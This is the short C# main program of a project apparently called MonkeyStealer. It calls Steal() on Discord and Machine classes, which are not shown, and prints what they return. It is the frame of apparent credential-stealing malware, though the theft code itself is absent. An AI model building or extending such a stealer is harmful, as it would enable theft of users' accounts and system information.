using System;
using MonkeyStealer.scripts;

namespace MonkeyStealer
{
    class Program
    {
        static void Main(string[] args)
        {
            var discord = new Discord();
            var machine = new Machine();
            List<List<string>> infos = new List<List<string>>() { discord.Steal(), machine.Steal() };
            foreach(var  info in infos)
            {
                foreach(var i in info)
                {
                    Console.WriteLine(i);
                }
            }
        }
    }
}
